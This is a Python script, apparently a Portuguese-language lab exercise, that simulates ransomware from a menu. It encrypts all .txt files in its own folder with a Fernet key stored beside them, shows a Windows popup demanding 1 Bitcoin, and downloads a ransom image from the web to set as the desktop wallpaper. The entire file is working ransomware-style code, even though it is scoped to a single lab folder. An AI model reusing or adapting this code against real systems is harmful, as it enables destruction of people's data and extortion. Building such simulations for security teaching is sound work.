import os
import ctypes
import urllib.request
from cryptography.fernet import Fernet

# ========== Key Management ==========
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    with open("key.key", "rb") as key_file:
        return key_file.read()

def if_key():
    if not os.path.exists("key.key"):
        print("[*] No key found. Generating new key...")
        return Fernet(write_key())
    else:
        print("[*] Key loaded.")
        return Fernet(load_key())

# ========== Encryption ==========
def encrypt_lab8folder():
    f = if_key()
    folder_path = os.path.dirname(os.path.abspath(__file__))

    for filename in os.listdir(folder_path):
        full_path = os.path.join(folder_path, filename)

        if os.path.isfile(full_path) and filename.endswith(".txt"):
            print(f"[DEBUG] Ficheiro identificado: {filename}")
            with open(full_path, "rb") as file:
                data = file.read()
            encrypted = f.encrypt(data)
            with open(full_path, "wb") as file:
                file.write(encrypted)
            print(f"[+] Encrypted: {filename}")

# ========== Ransomware Simulation ==========
def show_ransomware_warning():
    # Popup
    ctypes.windll.user32.MessageBoxW(
        0,
        "Os teus ficheiros foram encriptados!\nPaga 1 Bitcoin para os recuperar.",
        "Atenção: Ransomware Detetado",
        0x10 | 0x0
    )

    # Wallpaper
    wallpaper_url = "https://i.imgur.com/wEJQK4g.jpg"
    local_path = os.path.join(os.getenv("TEMP"), "ransom_note.jpg")
    urllib.request.urlretrieve(wallpaper_url, local_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, local_path, 3)

# ========== Menu ==========
def show_menu():
    while True:
        print("\n[ Menu Principal ]")
        print("1 - Encriptar ficheiros da pasta")
        print("2 - Mostrar aviso de ransomware")
        print("3 - Simular ransomware (encriptar + popup + wallpaper)")
        print("4 - Sair")
        escolha = input("Escolhe uma opção: ")

        if escolha == "1":
            encrypt_lab8folder()
        elif escolha == "2":
            show_ransomware_warning()
        elif escolha == "3":
            encrypt_lab8folder()
            show_ransomware_warning()
        elif escolha == "4":
            print("A sair...")
            break
        else:
            print("Opção inválida.")

# ========== Run ==========
if __name__ == "__main__":
    show_menu()
